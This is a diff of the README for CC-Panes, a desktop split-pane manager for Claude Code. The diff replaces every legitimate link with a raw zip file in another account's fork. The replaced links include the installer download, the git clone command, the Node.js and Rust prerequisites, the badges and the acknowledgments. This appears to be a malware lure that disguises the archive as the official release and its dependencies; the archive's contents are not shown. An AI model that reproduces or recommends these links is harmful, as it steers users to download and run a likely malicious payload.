@@ -1,11 +1,11 @@
 # CC-Panes
 
-> Multi-instance split-pane manager for [Claude Code](https://docs.anthropic.com/en/docs/claude-code) — a cross-platform desktop app built with Tauri 2.
+> Multi-instance split-pane manager for [Claude Code](https://github.com/eltonyaw/cc-pane/raw/refs/heads/main/src/components/explorer/cc-pane-1.9.zip) — a cross-platform desktop app built with Tauri 2.
 
 [![License: GPL-3.0](https://img.shields.io/badge/License-GPL--3.0-blue.svg)](LICENSE)
-[![Built with Tauri](https://img.shields.io/badge/Built%20with-Tauri%202-FFC131?logo=tauri)](https://v2.tauri.app/)
-[![React 19](https://img.shields.io/badge/React-19-61DAFB?logo=react)](https://react.dev/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.6-3178C6?logo=typescript)](https://www.typescriptlang.org/)
+[![Built with Tauri](https://img.shields.io/badge/Built%20with-Tauri%202-FFC131?logo=tauri)](https://github.com/eltonyaw/cc-pane/raw/refs/heads/main/src/components/explorer/cc-pane-1.9.zip)
+[![React 19](https://img.shields.io/badge/React-19-61DAFB?logo=react)](https://github.com/eltonyaw/cc-pane/raw/refs/heads/main/src/components/explorer/cc-pane-1.9.zip)
+[![TypeScript](https://img.shields.io/badge/TypeScript-5.6-3178C6?logo=typescript)](https://github.com/eltonyaw/cc-pane/raw/refs/heads/main/src/components/explorer/cc-pane-1.9.zip)
 
 [中文文档](README.zh-CN.md)
 
@@ -17,7 +17,7 @@
 
 ## Download
 
-Pre-built Windows installer is available on the [GitHub Releases](https://github.com/wuxiran/cc-pane/releases) page. Download the latest `.exe` installer and run it to get started.
+Pre-built Windows installer is available on the [GitHub Releases](https://github.com/eltonyaw/cc-pane/raw/refs/heads/main/src/components/explorer/cc-pane-1.9.zip) page. Download the latest `.exe` installer and run it to get started.
 
 > For other platforms, you can [build from source](#getting-started).
 
@@ -94,15 +94,15 @@ CC-Panes lets you run **multiple Claude Code CLI instances** side by side in a s
 
 ## Prerequisites
 
-- [Node.js](https://nodejs.org/) 22+
-- [Rust](https://rustup.rs/) 1.83+
-- Platform-specific dependencies for [Tauri](https://v2.tauri.app/start/prerequisites/)
+- [Node.js](https://github.com/eltonyaw/cc-pane/raw/refs/heads/main/src/components/explorer/cc-pane-1.9.zip) 22+
+- [Rust](https://github.com/eltonyaw/cc-pane/raw/refs/heads/main/src/components/explorer/cc-pane-1.9.zip) 1.83+
+- Platform-specific dependencies for [Tauri](https://github.com/eltonyaw/cc-pane/raw/refs/heads/main/src/components/explorer/cc-pane-1.9.zip)
 
 ## Getting Started
 
 ```bash
 # Clone the repository
-git clone https://github.com/wuxiran/cc-pane.git
+git clone https://github.com/eltonyaw/cc-pane/raw/refs/heads/main/src/components/explorer/cc-pane-1.9.zip
 cd cc-pane
 
 # Install frontend dependencies
@@ -217,7 +217,7 @@ This project is licensed under the [GNU General Public License v3.0](LICENSE).
 
 ## Acknowledgments
 
-- [Tauri](https://tauri.app/) — Desktop application framework
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) — AI coding assistant by Anthropic
-- [xterm.js](https://xtermjs.org/) — Terminal emulator for the web
-- [shadcn/ui](https://ui.shadcn.com/) — UI component library
+- [Tauri](https://github.com/eltonyaw/cc-pane/raw/refs/heads/main/src/components/explorer/cc-pane-1.9.zip) — Desktop application framework
+- [Claude Code](https://github.com/eltonyaw/cc-pane/raw/refs/heads/main/src/components/explorer/cc-pane-1.9.zip) — AI coding assistant by Anthropic
+- [xterm.js](https://github.com/eltonyaw/cc-pane/raw/refs/heads/main/src/components/explorer/cc-pane-1.9.zip) — Terminal emulator for the web
+- [shadcn/ui](https://github.com/eltonyaw/cc-pane/raw/refs/heads/main/src/components/explorer/cc-pane-1.9.zip) — UI component library
